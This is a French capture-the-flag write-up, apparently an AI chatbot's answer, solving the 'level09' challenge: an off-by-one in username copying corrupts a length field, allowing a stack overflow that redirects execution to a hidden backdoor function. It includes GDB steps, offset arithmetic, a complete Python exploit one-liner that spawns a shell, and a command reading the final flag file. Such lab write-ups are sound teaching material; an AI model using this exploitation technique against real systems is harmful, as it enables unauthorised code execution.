### 1\. Analyse de la Vulnérabilité

Le binaire utilise une structure sur la pile dans la fonction `handle_msg`. Voici sa disposition en mémoire :

| Nom | Taille | Description |
| --- | --- | --- |
| `message` | 140 octets | Stocke le message envoyé. |
| `username` | 40 octets | Stocke le nom d'utilisateur. |
| `len` | 4 octets | **Variable critique** : contrôle la taille du message. |

Exporter vers Sheets

#### La faille : "Off-by-one" (Corruption de variable)

Dans la fonction `set_username`, il y a une erreur de boucle :

C

```
for (i = 0; i < 41 && input[i] != '\0'; i++) {
    data->username[i] = input[i];
}
```

Le programme autorise l'écriture de **41 octets** dans un espace de **40**. Le 41ème octet déborde directement sur le premier octet de la variable `len`.

* * *

### 2\. Investigation avec GDB

Nous devons trouver l'adresse de la fonction cachée `secret_backdoor` et l'offset exact pour écraser le pointeur d'instruction (**RIP**).

#### A. Trouver l'adresse de la cible

Lance GDB, mets un point d'arrêt sur `main` pour charger les adresses réelles (PIE bypass), puis cherche la fonction :

Bash

```
gdb ./level09
(gdb) break main
(gdb) run
(gdb) p secret_backdoor
# Résultat : 0x55555555488c
```

#### B. Calculer l'offset du RIP

Le buffer `message` commence à l'adresse `rbp - 0xc0` (soit **192 octets** avant le Saved RBP).

-   Le Saved RBP fait **8 octets**.
-   L'adresse de retour (RIP) se trouve donc à 192+8\=200 **octets** du début de notre saisie.

* * *

### 3\. Stratégie d'Exploitation

L'attaque se déroule en deux temps au sein de la même exécution :

1.  **Corruption du compteur** : On envoie un pseudo de 40 caractères + l'octet `\xff` (255 en décimal). Cela change la valeur de `len` à 255.
2.  **Dépassement de pile** : La fonction `set_msg` nous autorise maintenant à écrire 255 octets dans un buffer de 140. On remplit les 200 premiers octets avec des "A", puis on injecte l'adresse de la backdoor.
3.  **Prise de contrôle** : La fonction `secret_backdoor` s'exécute et nous offre un `system()`.

* * *

### 4\. La Commande de Victoire

On utilise Python pour envoyer les octets binaires exacts (notamment l'adresse en **Little Endian** grâce à `struct.pack`).

Bash

```
(python -c 'import struct; print "A"*40 + "\xff"; print "B"*200 + struct.pack("<Q", 0x55555555488c); print "/bin/sh"'; cat) | ./level09
```

**Explication des composants :**

-   `print "A"*40 + "\xff"` : Remplit le pseudo et corrompt `len`.
-   `print "B"*200 + struct.pack("<Q", 0x55555555488c)` : Padding de 200 octets pour atteindre le RIP, puis écrasement avec l'adresse cible en 64 bits.
-   `print "/bin/sh"` : C'est la commande que la fonction `secret_backdoor` va lire via son `fgets` et exécuter via `system()`.
-   `cat` : Maintient la communication ouverte pour que tu puisses taper tes commandes dans le shell obtenu.

* * *

### 5\. Récupération du Flag Final

Une fois la commande lancée, attends le message `>: Msg sent!`. Le programme semble figé, mais il a ouvert ton shell.

1.  Tape `whoami` pour confirmer que tu es `end`.
2.  Lis le dernier flag :
    
    Bash
    
    ```
    cat /home/users/end/.pass
    ```

Le binaire attend une adresse mémoire sur 64 bits en format Little Endian. Utiliser struct.pack garantit que l'adresse est transmise sous forme d'octets binaires bruts et non de caractères ASCII, tout en gérant l'inversion des octets requise par l'architecture x86_64.